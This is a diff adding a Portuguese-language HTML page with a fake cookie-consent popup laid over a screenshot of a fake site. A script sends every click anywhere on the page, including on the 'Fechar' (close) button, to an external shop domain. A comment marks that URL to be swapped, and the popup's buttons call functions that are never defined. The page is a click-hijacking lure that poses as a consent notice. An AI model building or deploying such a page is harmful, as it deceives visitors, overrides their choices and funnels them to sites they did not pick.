@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Política de Cookies</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f1f1f1;
+    }
+
+    #popup-container {
+      display: none;
+      position: fixed;
+      z-index: 9999;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.5);
+    }
+
+    #popup {
+      background: #fff;
+      max-width: 500px;
+      margin: 10% auto;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      position: fixed;
+      z-index: 99;
+      bottom: -100px;
+      left: 30%;
+    }
+
+    #popup h2 {
+      margin-top: 0;
+      font-size: 24px;
+    }
+
+    #popup p {
+      color: #555;
+      font-size: 16px;
+      margin-bottom: 30px;
+    }
+
+    .popup-button {
+      padding: 12px 24px;
+      margin: 5px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .accept {
+      background-color: #4CAF50;
+      color: white;
+    }
+
+    .close {
+      background: none;
+      color: #4CAF50;
+      text-decoration: underline;
+
+    
+    }
+
+    .site {
+      width: 100%;
+      height: 100%;
+      display: block;
+    }
+  </style>
+</head>
+<body>
+
+<div id="popup-container">
+  <div id="popup">
+    <h2>Política de Cookies</h2>
+    <p>Este site utiliza cookies para melhorar sua experiência. Ao clicar em "Permitir", você concorda com nossa política de cookies.</p>
+    <button class="popup-button accept" onclick="aceitar()">Permitir</button>
+    <button class="popup-button close" onclick="fechar()">Fechar</button>
+  </div>
+  <img class="site" src="assets/fundo.png" alt="site falso">
+</div>
+
+<script>
+    // Redireciona ao clicar em qualquer parte da página
+    document.addEventListener('click', function () {
+      window.location.href = "https://www.impulsegram.shop"; // <-- TROCA AQUI
+    });
+  
+    // Mostra o popup depois de alguns segundos (apenas visual)
+    setTimeout(() => {
+      document.getElementById('popup-container').style.display = 'flex';
+    }, 1000);
+  </script>
+
+</body>
+</html>
